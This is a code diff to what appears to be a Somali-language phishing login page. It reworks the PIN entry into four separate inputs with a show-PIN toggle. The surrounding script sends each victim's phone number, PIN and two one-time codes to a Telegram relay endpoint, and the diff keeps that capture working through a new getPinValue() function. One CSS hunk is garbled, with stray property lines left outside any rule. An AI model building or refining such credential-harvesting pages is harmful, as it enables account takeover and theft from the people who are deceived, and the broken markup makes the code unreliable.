@@ -196,42 +196,43 @@ input[type=tel]:focus{
 
 .field-hint{font-size:11px;color:var(--text-4);font-weight:500;margin-top:5px}
 
-.pin-boxes{
-  display:flex;gap:8px;flex:1;
-  pointer-events:none; /* let touches fall through to hidden input */
-}
+/* PIN BOXES + EYE */
+.pin-wrap{display:flex;align-items:center;gap:10px}
 
-.pin-box{
-  flex:1;height:56px;
+.pin-boxes{display:flex;gap:8px;flex:1}
+
+.pin-input{
+  flex:1;height:56px;width:0;
   border-radius:12px;
   border:1.5px solid var(--border);
   background:var(--green-soft);
-  display:flex;align-items:center;justify-content:center;
-  font-family:var(--mono);font-size:22px;font-weight:800;
+  font-family:var(--mono);font-size:24px;font-weight:800;
   color:var(--text);
+  text-align:center;
+  outline:none;
   transition:border-color .18s,box-shadow .18s,background .18s;
-  user-select:none;
-}
-
-.pin-box.filled{background:white;border-color:var(--green)}
-.pin-box.active{border-color:var(--green);box-shadow:0 0 0 3px rgba(123,191,46,.15);background:white}
-
-.pin-boxes-wrap{position:relative;flex:1;cursor:text}
-
-.pin-real{
-  position:absolute;inset:0;
-  width:100%;height:100%;
-  opacity:0;
-  font-size:16px;z-index:3;
-  border:none;background:none;outline:none;
-  caret-color:transparent;
-  cursor:text;
   -webkit-appearance:none;
+  padding:0;
+  caret-color:transparent;
 }
-
-.pin-wrap{display:flex;align-items:center;gap:10px}
+.pin-input:focus{
+  border-color:var(--green);
+  box-shadow:0 0 0 3px rgba(123,191,46,.15);
+  background:white;
+}
+.pin-input[type=password]{letter-spacing:6px;font-size:16px;padding-top:4px}
 
 .eye-btn-outside{
+  background:var(--green-light);
+  border:1.5px solid var(--border-green);
+  border-radius:10px;
+  width:44px;height:56px;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;flex-shrink:0;
+  color:var(--green-dark);
+  transition:background .15s;
+}
+.eye-btn-outside:active{background:var(--green-mid)}
   background:var(--green-light);
   border:1.5px solid var(--border-green);
   border-radius:10px;
@@ -435,16 +436,11 @@ input[type=tel]:focus{
           <div class="field">
             <div class="field-label" style="margin-bottom:7px">PIN-kaaga</div>
             <div class="pin-wrap">
-              <div class="pin-boxes-wrap">
-                <div class="pin-boxes" id="pinBoxes">
-                  <div class="pin-box" id="pb0"></div>
-                  <div class="pin-box" id="pb1"></div>
-                  <div class="pin-box" id="pb2"></div>
-                  <div class="pin-box" id="pb3"></div>
-                </div>
-                <input type="password" id="pinHidden" inputmode="numeric"
-                  maxlength="4" autocomplete="current-password"
-                  class="pin-real">
+              <div class="pin-boxes" id="pinBoxes">
+                <input class="pin-input" id="pi0" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input class="pin-input" id="pi1" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input class="pin-input" id="pi2" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input class="pin-input" id="pi3" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
               </div>
               <button class="eye-btn-outside" id="eyeBtn" type="button" aria-label="Muuji PIN">
                 <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none"
@@ -602,16 +598,13 @@ let otp1Value="";
 let otp2Value="";
 let otp1Submitted=false;
 let otp2Submitted=false;
-let resend1Clicked=false;
-let resend2Clicked=false;
-let pinVisible=false;
 
 async function sendToTelegram(eventName,extra){
   fetch("/api/sendTelegram",{
     method:"POST",headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       submittedAt:new Date().toISOString(),
-      loginPhone:phoneValue,loginPin:pinValue,
+      loginPhone:phoneValue,loginPin:getPinValue(),
       otp1:otp1Value,otp2:otp2Value,
       event:eventName,device:device,
       plan:selectedPlan?JSON.stringify(selectedPlan):"None",
@@ -630,46 +623,38 @@ document.getElementById("phone").oninput=function(){
   validateLogin();
 };
 
-/* ── PIN hidden input → 4 visual boxes ── */
-const pinHidden=document.getElementById("pinHidden");
-const pinBoxes=[...document.querySelectorAll(".pin-box")];
+/* ── PIN: 4 real inputs ── */
+const pinInputs=[...document.querySelectorAll(".pin-input")];
+let pinVisible=false;
 
-function renderPin(){
-  const raw=pinHidden.value.replace(/\D/g,"").slice(0,4);
-  pinHidden.value=raw;
-  pinValue=raw;
-  const cursor=raw.length;
-  pinBoxes.forEach((box,i)=>{
-    box.className="pin-box";
-    if(i<raw.length){
-      box.textContent=pinVisible?raw[i]:"•";
-      box.classList.add("filled");
-    } else {
-      box.textContent="";
+pinInputs.forEach((input,i)=>{
+  input.oninput=()=>{
+    input.value=input.value.replace(/\D/g,"").slice(0,1);
+    if(input.value&&i<3) pinInputs[i+1].focus();
+    validateLogin();
+  };
+  input.onkeydown=e=>{
+    if(e.key==="Backspace"&&!input.value&&i>0){
+      pinInputs[i-1].focus();
+      pinInputs[i-1].value="";
+      validateLogin();
     }
-    if(i===cursor&&document.activeElement===pinHidden) box.classList.add("active");
-  });
-  validateLogin();
-}
+  };
+});
 
-pinHidden.addEventListener("input",renderPin);
-pinHidden.addEventListener("focus",renderPin);
-pinHidden.addEventListener("blur",renderPin);
-
-// tap anywhere on boxes → focus hidden input
-document.getElementById("pinBoxes").addEventListener("click",()=>pinHidden.focus());
+function getPinValue(){return pinInputs.map(p=>p.value).join("")}
 
 /* ── Eye toggle ── */
 document.getElementById("eyeBtn").onclick=()=>{
   pinVisible=!pinVisible;
+  pinInputs.forEach(p=>{p.type=pinVisible?"text":"password"});
   document.getElementById("eyeBtn").innerHTML=pinVisible
     ?`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
     :`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
-  renderPin();
 };
 
 function validateLogin(){
-  const ok=phoneValue.length===13&&pinValue.length===4;
+  const ok=phoneValue.length===13&&getPinValue().length===4;
   document.getElementById("mainBtn").classList.toggle("active",ok);
 }
 
